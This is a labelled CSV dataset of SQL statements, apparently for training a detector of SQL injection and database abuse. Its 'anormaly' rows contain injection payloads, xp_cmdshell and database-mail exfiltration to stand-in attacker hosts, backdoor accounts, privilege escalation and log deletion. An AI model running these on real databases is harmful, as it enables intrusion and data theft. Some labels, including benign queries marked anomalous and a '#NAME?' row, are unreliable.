query log,status,label
"SELECT count(*) FROM orders WHERE status = 'shipped' AND created_at > DATE_SUB(NOW(), INTERVAL 1 DAY);",normaly,1
"SELECT category, AVG(price) FROM products GROUP BY category;",normaly,1
SELECT * FROM notifications WHERE user_id = 88 ORDER BY created_at DESC LIMIT 10 OFFSET 20;,normaly,1
UPDATE inventory SET stock = stock - 1 WHERE product_id = 101 AND stock > 0;,normaly,1
SELECT * FROM articles WHERE title LIKE 'How to%';,normaly,1
"SELECT id FROM tags WHERE tag_name IN ('tech', 'sql', 'ai');",normaly,1
SELECT name FROM employees WHERE department_id = 5 AND hire_date > '2023-01-01';,normaly,1
SELECT * FROM comments WHERE post_id = 1202 AND is_approved = 1;,normaly,1
SELECT email FROM newsletter_subs WHERE active = true;,normaly,1
"SELECT * FROM users WHERE username = 'admin' UNION SELECT credit_card, password, ssn FROM customers WHERE '1' = '1'",anormaly,0
SELECT * FROM users WHERE username = 'admin' OR '1' = '1' -- AND password = '...',anormaly,0
"SELECT product_id, name FROM products WHERE category = 'electronics'; DROP TABLE users; --",anormaly,0
"SELECT * FROM accounts WHERE account_id = 1 AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users), 1, 1)) > 100",anormaly,0
SELECT * FROM orders WHERE order_id = 1; WAITFOR DELAY '00:00:10'; --,anormaly,0
SELECT * FROM products WHERE id = 1; EXEC xp_cmdshell 'nslookup data.attacker.com',anormaly,0
"INSERT INTO comments (user_id, comment) VALUES (1, 'admin' + CHAR(124) + (SELECT password FROM users WHERE username='admin'))",anormaly,0
SELECT * FROM users/* bypass */WHERE username = 'admin' --,anormaly,0
SELECT * FROM products WHERE id = 1; EXEC('UPDATE users SET is_admin = 1 WHERE username = ''attacker'''),anormaly,0
SELECT * FROM users WHERE username = 0x61646D696E27 OR 1=1--,anormaly,0
SELECT * FROM users WHERE username = 'admin' AND password = 'password123',anormaly,0
"SELECT * FROM users WHERE username = 'admin' AND password = 'admin'
SELECT * FROM users WHERE username = 'admin' AND password = '123456'
SELECT * FROM users WHERE username = 'admin' AND password = 'qwerty'",anormaly,0
"SELECT * FROM users WHERE username = 'admin' AND password = 'Winter2024!'
SELECT * FROM users WHERE username = 'administrator' AND password = 'Winter2024!'
SELECT * FROM users WHERE username = 'sysadmin' AND password = 'Winter2024!'",anormaly,0
SELECT * FROM employees WHERE username = '*)(objectClass=*))(|(uid=*,anormaly,0
"SELECT * FROM users WHERE username = ''' AND 1=CONVERT(int, (SELECT password FROM users WHERE username='admin')) --",anormaly,0
UPDATE users SET api_token = 'attacker_token' WHERE username = 'admin',anormaly,0
UPDATE password_resets SET token = 'hacked' WHERE user_id = 1,anormaly,0
UPDATE sessions SET session_id = 'hijacked_session' WHERE user_id = 1,anormaly,0
"INSERT INTO logins (username, password_hash) VALUES ('attacker', (SELECT password_hash FROM users WHERE username='admin'))",anormaly,0
SELECT * FROM users WHERE username = 'admin' AND password_hash = '0x5F4DCC3B5AA765D61D8327DEB882CF99',anormaly,0
"UPDATE users SET role = 'admin', is_superuser = 1 WHERE username = 'attacker'",anormaly,0
"EXEC sp_addsrvrolemember 'attacker_user', 'sysadmin'",anormaly,0
"CREATE LOGIN backdoor WITH PASSWORD = 'Pa$$w0rd123!'
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin'",anormaly,0
"CREATE PROCEDURE usp_legitProcedure
AS
BEGIN
    -- Legitimate code
    EXEC sp_addsrvrolemember 'hacker', 'db_owner'
END
",anormaly,0
"CREATE TRIGGER trg_backdoor
ON users AFTER INSERT
AS
BEGIN
    EXECUTE AS USER = 'dbo'
    INSERT INTO admin_users SELECT * FROM inserted WHERE username = 'attacker'
END",anormaly,0
ALTER AUTHORIZATION ON DATABASE::ProductionDB TO [attacker_user],anormaly,0
ALTER ROLE db_owner ADD MEMBER public,anormaly,0
"EXECUTE AS LOGIN = 'sa'
SELECT * FROM sensitive_data",anormaly,0
"BACKUP CERTIFICATE master_cert TO FILE = 'C:\temp\cert.cer'
WITH PRIVATE KEY (FILE = 'C:\temp\key.pvk', ENCRYPTION BY PASSWORD = 'hack')",anormaly,0
"EXEC sp_procoption @ProcName = 'usp_backdoor', @OptionName = 'startup', @OptionValue = 'true'",anormaly,0
SELECT * FROM customers WHERE 1=1,anormaly,0
"SELECT credit_card_number, ssn, dob FROM users ORDER BY id",anormaly,0
"SELECT column_name FROM information_schema.columns 
WHERE column_name LIKE '%ssn%' OR column_name LIKE '%credit%' OR column_name LIKE '%password%'",anormaly,0
"SELECT patient_id, diagnosis, treatment, insurance_id FROM medical_records",anormaly,0
"SELECT customer_id, SUM(transaction_amount), AVG(balance) 
FROM financial_transactions 
GROUP BY customer_id",anormaly,0
SELECT * FROM employee_salaries WHERE salary > 100000,anormaly,0
"SELECT u.username, p.credit_card, a.ssn 
FROM users u 
JOIN payments p ON u.id = p.user_id
JOIN applications a ON u.id = a.user_id",anormaly,0
"SELECT t.name AS table_name, c.name AS column_name
FROM sys.tables t
JOIN sys.columns c ON t.object_id = c.object_id
WHERE c.name LIKE '%secret%' OR c.name LIKE '%confidential%'",anormaly,0
"SELECT encrypted_data, encryption_key_id FROM secure_messages",anormaly,0
SELECT TOP 1000 * FROM customers WHERE customer_id % 100 = 0,anormaly,0
SELECT * INTO OUTFILE 'C:\temp\export.csv' FROM customers,anormaly,0
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.sensitive_table" queryout "C:\export\data.txt" -T -c',anormaly,0
BACKUP DATABASE CustomerDB TO DISK = 'C:\temp\backup.bak' WITH COMPRESSION,anormaly,0
"SELECT * FROM employees FOR XML AUTO, ELEMENTS, ROOT('Employees')",anormaly,0
"SELECT * FROM credit_cards FOR JSON PATH, ROOT('CreditCards')",anormaly,0
"INSERT INTO OPENQUERY(LINKED_SERVER, 'SELECT * FROM remote_table')
SELECT * FROM local_sensitive_table",anormaly,0
"EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'attacker@example.com',
    @query = 'SELECT * FROM confidential_data',
    @attach_query_result_as_file = 1",anormaly,0
EXEC xp_cmdshell 'echo SELECT * FROM users > export.sql && ftp -s:ftp_commands.txt',anormaly,0
#NAME?,anormaly,0
"CREATE TABLE staging_export AS SELECT * FROM sensitive_data
EXEC xp_cmdshell 'copy C:\db\staging_export.* \\attacker-server\share\'",anormaly,0
UPDATE products SET price = price * RAND() WHERE product_id BETWEEN 1 AND 1000,anormaly,0
"DELETE FROM audit_logs WHERE timestamp > DATEADD(month, -1, GETDATE())",anormaly,0
UPDATE transactions SET amount = amount * -1 WHERE transaction_type = 'credit',anormaly,0
"UPDATE orders SET order_date = DATEADD(year, -1, order_date) WHERE order_id > 10000",anormaly,0
UPDATE customers SET id = id + 10000 WHERE id < 100,anormaly,0
UPDATE users SET email = CAST(ssn AS VARCHAR) WHERE user_id < 50,anormaly,0
UPDATE inventory SET quantity = 9999 WHERE product_id = 123,anormaly,0
UPDATE bank_accounts SET balance = balance + 10000 WHERE account_owner = 'attacker',anormaly,0
"TRUNCATE TABLE security_logs
DBCC SHRINKFILE (security_log, 1)",anormaly,0
"BEGIN TRANSACTION
    UPDATE account_balances SET balance = balance - 1000 WHERE account_id = 1
    UPDATE account_balances SET balance = balance + 1000 WHERE account_id = 2
-- Note: No COMMIT, leaving transaction open",anormaly,0
"WITH RecursiveCTE AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM RecursiveCTE
)
SELECT * FROM RecursiveCTE OPTION (MAXRECURSION 0)",anormaly,0
"SELECT * FROM table1, table2, table3, table4, table5",anormaly,0
"DECLARE @i INT = 0
WHILE @i < 10000
BEGIN
    EXEC('CREATE TABLE fill_disk_' + CAST(@i AS VARCHAR) + ' (col1 CHAR(8000))')
    INSERT INTO fill_disk VALUES (REPLICATE('X', 8000))
    SET @i = @i + 1
END",anormaly,0
"BEGIN TRANSACTION
    UPDATE large_table SET col1 = NEWID()
    -- No COMMIT or ROLLBACK",anormaly,0
"DECLARE @conn INT = 0
WHILE @conn < 1000
BEGIN
    EXEC sp_executesql 'SELECT 1'
    SET @conn = @conn + 1
END",anormaly,0
"BEGIN TRANSACTION
    UPDATE customers WITH (TABLOCKX) SET status = 'inactive' WHERE 1=1
    WAITFOR DELAY '00:10:00'",anormaly,0
"SELECT * INTO #temp FROM sys.all_objects a, sys.all_objects b, sys.all_objects c",anormaly,0
"-- Session 1:
BEGIN TRANSACTION
    UPDATE accounts SET balance = balance - 100 WHERE id = 1
    WAITFOR DELAY '00:00:05'
    UPDATE accounts SET balance = balance + 100 WHERE id = 2",anormaly,0
UPDATE huge_table SET indexed_column = indexed_column + 1 WHERE 1=1,anormaly,0
"UPDATE STATISTICS customers WITH ROWCOUNT = 1000000000, PAGECOUNT = 1000000",anormaly,0
"SELECT * FROM orders WHERE order_date > '2024-01-01' ORDER BY customer_id, amount DESC",anormaly,0
"EXEC sp_executesql N'SELECT * FROM orders WHERE customer_id = @id', N'@id INT', @id = 1",anormaly,0
"SELECT * FROM large_table l
INNER LOOP JOIN huge_table h ON l.id = h.id
WHERE l.value < 100",anormaly,0
"SELECT * FROM products 
WHERE price > (SELECT AVG(price) FROM products)
AND category IN (SELECT category FROM categories WHERE active = 1)
AND supplier_id IN (SELECT supplier_id FROM suppliers WHERE rating > 4)",anormaly,0
SELECT * FROM users WHERE YEAR(created_date) = 2024 AND MONTH(created_date) = 1,anormaly,0
SELECT * FROM transactions WHERE transaction_id = '12345' -- transaction_id is INT,anormaly,0
"DECLARE @sql NVARCHAR(MAX)
SET @sql = 'SELECT * FROM ' + QUOTENAME(@tableName)
EXEC sp_executesql @sql",anormaly,0
"SELECT * FROM orders o
CROSS APPLY dbo.udf_GetOrderDetails(o.order_id) od",anormaly,0
"SELECT * FROM large_table
OPTION (MAXDOP 0, QUERYTRACEON 8649)",anormaly,0
"SELECT * FROM products WITH (INDEX(0))
WHERE price BETWEEN 100 AND 200",anormaly,0
ALTER AUTHORIZATION ON DATABASE::ProductionDB TO [public],anormaly,0
GRANT CONTROL SERVER TO [guest],anormaly,0
ALTER TABLE financial_transactions DROP COLUMN audit_trail,anormaly,0
"ALTER DATABASE ProductionDB SET TRUSTWORTHY ON
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE",anormaly,0
ALTER DATABASE ProductionDB SET RECOVERY SIMPLE,anormaly,0
ALTER TABLE users DROP CONSTRAINT chk_password_complexity,anormaly,0
DROP INDEX idx_customer_email ON customers,anormaly,0
ALTER TABLE logs ALTER COLUMN message VARCHAR(10),anormaly,0
ALTER TABLE orders DROP CONSTRAINT fk_orders_customers,anormaly,0
"ALTER TABLE payments ALTER COLUMN amount DECIMAL(18,2) NULL",anormaly,0
"UPDATE transactions SET amount = ROUND(amount, 2)
INSERT INTO audit_account (amount) VALUES (amount - ROUND(amount, 2))",anormaly,0
"INSERT INTO transactions (account_id, amount, type) 
VALUES (123, -10000, 'transfer')",anormaly,0
"INSERT INTO processed_payments (payment_id, amount)
SELECT payment_id, amount FROM payments WHERE status = 'pending'
UNION ALL
SELECT payment_id, amount FROM payments WHERE status = 'pending'",anormaly,0
"-- T1: Check balance
SELECT balance FROM accounts WHERE account_id = 123
-- T1: If balance > amount, process withdrawal
UPDATE accounts SET balance = balance - 1000 WHERE account_id = 123",anormaly,0
UPDATE currency_rates SET rate = rate * 0.99 WHERE currency = 'USD',anormaly,0
"UPDATE savings_accounts 
SET balance = balance * (1 + interest_rate/365) 
WHERE account_id IN (SELECT account_id FROM attacker_accounts)",anormaly,0
"INSERT INTO refunds (transaction_id, amount, reason)
SELECT transaction_id, amount, 'fraud' 
FROM transactions 
WHERE customer_id = 456",anormaly,0
"UPDATE loan_payments SET status = 'paid'
WHERE due_date = '2024-01-15'
AND payment_amount > (SELECT approved_amount FROM loans WHERE loan_id = payments.loan_id)",anormaly,0
"UPDATE invoices SET tax_amount = 0 
WHERE customer_type = 'internal' 
AND total_amount > 10000",anormaly,0
"UPDATE sales SET commission_rate = 
    CASE WHEN salesperson_id = 999 THEN 0.5 
    ELSE 0.1 
    END
WHERE sale_date = '2024-01-15'",anormaly,0
UPDATE shopping_cart SET price = 0.01 WHERE product_id = 999,anormaly,0
UPDATE order_items SET quantity = 999999 WHERE order_id = 12345,anormaly,0
"INSERT INTO applied_coupons (order_id, coupon_code)
VALUES (456, 'SAVE50'), (457, 'SAVE50'), (458, 'SAVE50')",anormaly,0
"UPDATE user_points SET points = points + 10000 
WHERE user_id = 789 
AND last_updated < DATEADD(minute, -5, GETDATE())",anormaly,0
"UPDATE users SET birth_date = DATEADD(year, -21, GETDATE()) 
WHERE user_id = 555 
AND account_type = 'restricted'",anormaly,0
"INSERT INTO reservations (product_id, quantity, expires_at)
VALUES (888, 1000, DATEADD(year, 1, GETDATE()))",anormaly,0
"UPDATE user_sessions SET expires_at = DATEADD(year, 1, GETDATE())
WHERE session_token = 'stolen_token'",anormaly,0
"UPDATE user_profiles SET country = 'US' 
WHERE user_id = 777 
AND original_country = 'restricted_country'",anormaly,0
"INSERT INTO api_requests (user_id, endpoint, timestamp)
SELECT 999, '/api/transfer', GETDATE() FROM generate_series(1, 1000)",anormaly,0
"UPDATE orders SET status = 'shipped', payment_status = 'pending'
WHERE order_id = 8888",anormaly,0
"SELECT user_id, username, email FROM users 
WHERE username = 'johndoe' AND password_hash = '0x5F4DCC3B5AA765D61D8327DEB882CF99'",normaly,1
"UPDATE users SET password_hash = NEWID(), last_password_change = GETDATE()
WHERE user_id = 123",normaly,1
"INSERT INTO user_sessions (user_id, session_token, created_at, expires_at)
VALUES (123, NEWID(), GETDATE(), DATEADD(hour, 1, GETDATE()))

-- Example 4: Failed login attempt (wrong password)
SELECT user_id FROM users 
WHERE username = 'johndoe' AND password_hash = 'wrong_hash'

-- Example 5: Account lockout after multiple failures
UPDATE users SET login_attempts = login_attempts + 1
WHERE username = 'johndoe'",normaly,1
"SELECT first_name, last_name, email, phone 
FROM customers 
WHERE customer_id = 456",normaly,1
"SELECT product_id, name, price, category 
FROM products 
WHERE category = 'electronics' 
AND price BETWEEN 100 AND 500
ORDER BY name
OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY",normaly,1
"SELECT order_id, order_date, total_amount, status 
FROM orders 
WHERE customer_id = 789 
AND order_date > DATEADD(month, -6, GETDATE())
ORDER BY order_date DESC",normaly,1
"SELECT product_id, quantity, reorder_level 
FROM inventory 
WHERE warehouse_id = 1 
AND quantity < reorder_level",normaly,1
"SELECT product_id, SUM(quantity) as total_sold, SUM(amount) as revenue
FROM sales 
WHERE sale_date BETWEEN '2024-01-01' AND '2024-01-31'
GROUP BY product_id
ORDER BY revenue DESC",normaly,1
"INSERT INTO customers (first_name, last_name, email, phone, created_at)
VALUES ('Jane', 'Smith', 'jane@example.com', '555-1234', GETDATE())",normaly,1
"BEGIN TRANSACTION
    INSERT INTO orders (customer_id, order_date, total_amount, status)
    VALUES (123, GETDATE(), 199.99, 'pending')
    
    INSERT INTO order_items (order_id, product_id, quantity, price)
    VALUES (SCOPE_IDENTITY(), 456, 2, 99.99)
COMMIT TRANSACTION",normaly,1
"UPDATE products SET price = 129.99, last_updated = GETDATE()
WHERE product_id = 789 AND category = 'electronics'",normaly,1
"UPDATE customers SET phone = '555-5678', updated_at = GETDATE()
WHERE customer_id = 123 AND email = 'john@example.com'",normaly,1
"UPDATE users SET is_active = 0, deactivated_at = GETDATE()
WHERE last_login < DATEADD(year, -1, GETDATE())",normaly,1
"BACKUP DATABASE ProductionDB TO DISK = 'D:\Backups\Prod_20240115.bak'
WITH COMPRESSION, CHECKSUM",normaly,1
"ALTER INDEX idx_customer_email ON customers REBUILD
WITH (ONLINE = ON, MAXDOP = 4)",normaly,1
"UPDATE STATISTICS sales WITH FULLSCAN, ALL",normaly,1
"GRANT SELECT, INSERT, UPDATE ON orders TO sales_team",normaly,1
"DBCC CHECKDB ('ProductionDB') WITH ALL_ERRORMSGS, NO_INFOMSGS",normaly,1
"UPDATE inventory SET quantity = quantity - s.quantity
FROM sales s
WHERE inventory.product_id = s.product_id
AND s.sale_date = CONVERT(date, GETDATE())",normaly,1
"INSERT INTO invoices (customer_id, amount, due_date, status)
SELECT customer_id, SUM(amount), DATEADD(day, 30, GETDATE()), 'pending'
FROM monthly_usage
WHERE month = MONTH(GETDATE())
GROUP BY customer_id",normaly,1
"BEGIN TRANSACTION
    UPDATE accounts SET balance = balance - 100
    WHERE account_id = 123
    
    INSERT INTO transactions (from_account, to_account, amount, type)
    VALUES (123, 456, 100, 'transfer')
    
    UPDATE accounts SET balance = balance + 100
    WHERE account_id = 456
COMMIT TRANSACTION",normaly,1
"INSERT INTO purchase_orders (supplier_id, product_id, quantity, unit_price)
SELECT supplier_id, product_id, reorder_quantity, current_price
FROM inventory
WHERE quantity < minimum_stock",normaly,1
"INSERT INTO notifications (user_id, type, message, sent_at)
SELECT user_id, 'promotional', 'New sale starting tomorrow!', GETDATE()
FROM users
WHERE marketing_opt_in = 1
AND last_purchase_date > DATEADD(month, -3, GETDATE())",normaly,1
"INSERT INTO security_log (user_id, action, ip_address, timestamp)
VALUES (123, 'login_success', '192.168.1.100', GETDATE())",normaly,1
"INSERT INTO audit_trail (table_name, record_id, action, old_value, new_value, changed_by, changed_at)
SELECT 'customers', 123, 'UPDATE', 
    'phone=555-1234', 'phone=555-5678', 
    CURRENT_USER, GETDATE()",normaly,1
"INSERT INTO error_log (error_number, error_message, procedure_name, line_number, timestamp)
VALUES (50000, 'Invalid parameter value', 'usp_ProcessOrder', 45, GETDATE())",normaly,1
"INSERT INTO performance_log (query_hash, duration_ms, cpu_time, logical_reads, execution_count, timestamp)
VALUES (0x1A2B3C4D, 150, 120, 500, 1, GETDATE())",normaly,1
"DELETE FROM security_log 
WHERE timestamp < DATEADD(year, -1, GETDATE())",normaly,1
"SELECT user_id, expires_at 
FROM api_tokens 
WHERE token = 'valid_token_123'
AND expires_at > GETDATE()",normaly,1
"UPDATE product_cache 
SET data = (SELECT * FROM products FOR JSON PATH),
    updated_at = GETDATE()
WHERE cache_key = 'all_products'",normaly,1
"UPDATE message_queue 
SET status = 'processing', started_at = GETDATE()
WHERE message_id = 999
AND status = 'pending'",normaly,1
"SELECT COUNT(*) as request_count
FROM api_requests 
WHERE user_id = 123 
AND timestamp > DATEADD(minute, -1, GETDATE())",normaly,1
"SELECT config_key, config_value 
FROM application_config 
WHERE environment = 'production'",normaly,1
"SELECT CONVERT(date, sale_date) as sale_date,
       COUNT(*) as transaction_count,
       SUM(amount) as total_revenue,
       AVG(amount) as average_order_value
FROM sales
WHERE sale_date >= DATEADD(day, -7, GETDATE())
GROUP BY CONVERT(date, sale_date)
ORDER BY sale_date DESC",normaly,1
"SELECT 
    CASE 
        WHEN total_purchases > 1000 THEN 'VIP'
        WHEN total_purchases > 500 THEN 'Premium'
        WHEN total_purchases > 100 THEN 'Regular'
        ELSE 'New'
    END as segment,
    COUNT(*) as customer_count,
    AVG(total_purchases) as avg_spend
FROM customer_summary
GROUP BY 
    CASE 
        WHEN total_purchases > 1000 THEN 'VIP'
        WHEN total_purchases > 500 THEN 'Premium'
        WHEN total_purchases > 100 THEN 'Regular'
        ELSE 'New'
    END",normaly,1
"SELECT p.product_id, p.name, 
       SUM(s.quantity) as units_sold,
       AVG(i.quantity) as avg_inventory,
       (SUM(s.quantity) / NULLIF(AVG(i.quantity), 0)) as turnover_rate
FROM products p
JOIN sales s ON p.product_id = s.product_id
JOIN inventory i ON p.product_id = i.product_id
WHERE s.sale_date >= DATEADD(month, -3, GETDATE())
GROUP BY p.product_id, p.name
HAVING AVG(i.quantity) > 0",normaly,1
"SELECT CONVERT(date, visit_time) as visit_date,
       COUNT(DISTINCT session_id) as unique_sessions,
       COUNT(*) as page_views,
       AVG(time_on_page) as avg_time_on_page
FROM website_analytics
WHERE visit_time >= DATEADD(day, -30, GETDATE())
GROUP BY CONVERT(date, visit_time)
ORDER BY visit_date DESC",normaly,1
"SELECT e.employee_id, e.first_name, e.last_name,
       COUNT(o.order_id) as orders_processed,
       SUM(o.total_amount) as total_sales,
       AVG(o.customer_rating) as avg_rating
FROM employees e
LEFT JOIN orders o ON e.employee_id = o.assigned_to
WHERE o.order_date >= DATEADD(month, -1, GETDATE())
GROUP BY e.employee_id, e.first_name, e.last_name
ORDER BY total_sales DESC",normaly,1
"DELETE FROM temp_sessions 
WHERE created_at < DATEADD(hour, -24, GETDATE())",normaly,1
"INSERT INTO orders_archive
SELECT * FROM orders 
WHERE order_date < DATEADD(year, -2, GETDATE())

DELETE FROM orders 
WHERE order_date < DATEADD(year, -2, GETDATE())",normaly,1
"UPDATE currency_rates 
SET rate = new_rate, updated_at = GETDATE()
FROM external_exchange_rates e
WHERE currency_rates.currency_code = e.currency_code",normaly,1
EXEC sp_refreshview 'v_sales_summary',normaly,1
"INSERT INTO product_search_index (product_id, search_text)
SELECT product_id, name + ' ' + description + ' ' + category
FROM products
WHERE last_updated > DATEADD(day, -1, GETDATE())",normaly,1
"INSERT INTO products (name, category, price, supplier_id)
SELECT product_name, category, unit_price, supplier_code
FROM external_product_feed
WHERE import_date = CONVERT(date, GETDATE())",normaly,1
"UPDATE staging_customers
SET email = LOWER(TRIM(email)),
    phone = REPLACE(REPLACE(REPLACE(phone, '(', ''), ')', ''), '-', ''),
    processed_at = GETDATE()
WHERE processed_at IS NULL",normaly,1
"UPDATE data_quality_log
SET status = 'failed',
    error_message = 'Invalid email format'
FROM staging_customers s
WHERE data_quality_log.record_id = s.customer_id
AND s.email NOT LIKE '%@%.%'",normaly,1
"UPDATE etl_batches
SET status = 'completed',
    end_time = GETDATE(),
    records_processed = @@ROWCOUNT
WHERE batch_id = 12345
AND status = 'processing'",normaly,1
"INSERT INTO etl_errors (batch_id, table_name, error_message, error_data)
VALUES (12345, 'customers', 
        'Duplicate key violation', 
        '{""customer_id"": 456, ""email"": ""duplicate@example.com""}')",normaly,1
CREATE USER 'backdoor' IDENTIFIED BY 'secret'; GRANT ADMIN TO 'backdoor',anormaly,0
ALTER USER 'dbuser' WITH SUPERUSER,anormaly,0
EXECUTE IMMEDIATE 'CREATE ROLE admin_role WITH SUPERUSER',anormaly,0
UPDATE pg_authid SET rolcatupdate = true WHERE rolname = 'attacker',anormaly,0
"INSERT INTO sysusers (name, roles) VALUES ('intruder', 'sysadmin')",anormaly,0
SET ROLE dba; SELECT * FROM system_tables,anormaly,0
CREATE PROCEDURE backdoor_proc AS EXEC('xp_cmdshell ''net localgroup administrators hacker /add'''),anormaly,0
GRANT SELECT ON sys.sysprocesses TO 'lowpriv',anormaly,0
ALTER TABLE users ADD COLUMN backdoor_access BOOLEAN DEFAULT TRUE,anormaly,0
SELECT ssn FROM employees WHERE id > 0,anormaly,0
SELECT * FROM staff WHERE shift = 'evening',normaly,1
"INSERT INTO shifts (staff_id, date) VALUES (70, '2026-01-07')",normaly,1
SELECT COUNT(*) FROM tables WHERE occupied = FALSE,normaly,1
UPDATE inventory SET quantity = quantity + 50 WHERE item = 'Flour',normaly,1
DELETE FROM expired_items WHERE expiry < CURRENT_DATE,normaly,1
SELECT AVG(rating) FROM reviews GROUP BY order_id,normaly,1
"INSERT INTO suppliers (name, contact) VALUES ('VendorX', 'vendor@x.com')",normaly,1
SELECT * FROM purchases JOIN suppliers ON purchases.supplier_id = suppliers.id,normaly,1
UPDATE bills SET paid = TRUE WHERE id = 230,normaly,1
DELETE FROM old_orders WHERE date < '2025-01-01',normaly,1
SELECT MAX(total) FROM bills,normaly,1
"INSERT INTO promotions (code, discount) VALUES ('JAN10', 10)",normaly,1
SELECT * FROM logs WHERE event = 'order_placed' ORDER BY time,normaly,1
UPDATE reservations SET confirmed = TRUE WHERE id = 240,normaly,1
DELETE FROM cancellations WHERE processed = TRUE,normaly,1
SELECT DISTINCT category FROM menu_items,normaly,1
"INSERT INTO audits (action, time) VALUES ('update_menu', NOW())",normaly,1
SELECT * FROM finances WHERE type = 'income',normaly,1
UPDATE staff SET salary = salary * 1.05 WHERE id = 70,normaly,1
DELETE FROM archived_logs WHERE date < '2024-01-01',normaly,1
SELECT COUNT(DISTINCT customer_id) FROM orders,normaly,1
SELECT title FROM books WHERE author = 'Doe',normaly,1
"INSERT INTO library (book_id, borrower) VALUES (300, 130)",normaly,1
UPDATE books SET available = FALSE WHERE id = 300,normaly,1
DELETE FROM overdue_fines WHERE paid = TRUE,normaly,1
SELECT * FROM borrowers WHERE membership_active = TRUE,normaly,1
"INSERT INTO fines (borrower_id, amount) VALUES (130, 5.00)",normaly,1
SELECT SUM(fines) FROM overdue GROUP BY borrower_id,normaly,1
UPDATE borrowers SET membership_renewed = CURRENT_DATE WHERE id = 130,normaly,1
DELETE FROM returned_books WHERE return_date < NOW() - INTERVAL '30 DAY',normaly,1
SELECT * FROM categories WHERE books_count > 0,normaly,1
INSERT INTO authors (name) VALUES ('Jane Smith'),normaly,1
SELECT COUNT(*) FROM books WHERE genre = 'Fiction',normaly,1
UPDATE library SET due_date = due_date + INTERVAL '7 DAY' WHERE book_id = 310,normaly,1
DELETE FROM lost_books WHERE reported < '2025-01-01',normaly,1
SELECT AVG(rating) FROM book_reviews GROUP BY book_id,normaly,1
"INSERT INTO reviews (book_id, score) VALUES (300, 4.5)",normaly,1
SELECT * FROM books JOIN authors ON books.author_id = authors.id,normaly,1
UPDATE fines SET paid = TRUE WHERE id = 250,normaly,1
DELETE FROM inactive_members WHERE last_borrow < '2024-01-01',normaly,1
SELECT MIN(publication_year) FROM books,normaly,1
"INSERT INTO donations (book_name, donor) VALUES ('Old Book', 'Anonymous')",normaly,1
SELECT * FROM logs WHERE action = 'borrow' ORDER BY date DESC,normaly,1
UPDATE books SET rating = (SELECT AVG(score) FROM reviews WHERE book_id = books.id),normaly,1
DELETE FROM temp_entries WHERE created < NOW() - INTERVAL '1 HOUR',normaly,1
SELECT DISTINCT genre FROM books,normaly,1
"INSERT INTO events (type, date) VALUES ('Book Fair', '2026-03-01')",normaly,1
SELECT * FROM budgets WHERE category = 'Acquisitions',normaly,1
UPDATE authors SET books_count = books_count + 1 WHERE id = 80,normaly,1
DELETE FROM archived_records WHERE year < 2023,normaly,1
SELECT COUNT(DISTINCT borrower_id) FROM library,normaly,1
"INSERT INTO assets (name, value) VALUES ('Server', 5000)",normaly,1
SELECT * FROM configurations WHERE env = 'production',normaly,1
UPDATE orders SET delivery_date = '2026-01-10' WHERE id = 210,normaly,1
DELETE FROM error_logs WHERE severity = 'info',normaly,1
SELECT DISTINCT email FROM newsletter_subscribers,normaly,1
"INSERT INTO milestones (project_id, description) VALUES (100, 'Phase 1 complete')",normaly,1
SELECT * FROM budgets WHERE department = 'IT',normaly,1
UPDATE employees SET vacation_days = vacation_days - 1 WHERE id = 60,normaly,1
DELETE FROM inactive_accounts WHERE last_activity < '2024-01-01',normaly,1
SELECT AVG(age) FROM customers GROUP BY gender,normaly,1
"SELECT name, price FROM menu WHERE available = TRUE",normaly,1
"INSERT INTO reservations (table_id, time) VALUES (3, '18:00')",normaly,1
UPDATE tables SET occupied = FALSE WHERE id = 3,normaly,1
DELETE FROM menu_items WHERE stock = 0,normaly,1
SELECT * FROM orders WHERE customer_id = 120 LIMIT 5,normaly,1
"INSERT INTO reviews (order_id, rating) VALUES (220, 4)",normaly,1
SELECT SUM(total) FROM bills WHERE paid = TRUE,normaly,1
UPDATE customers SET loyalty_points = loyalty_points + 10 WHERE id = 120,normaly,1
DELETE FROM waitlist WHERE time < NOW(),normaly,1
timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SET GLOBAL max_connections = 1,anormaly,0
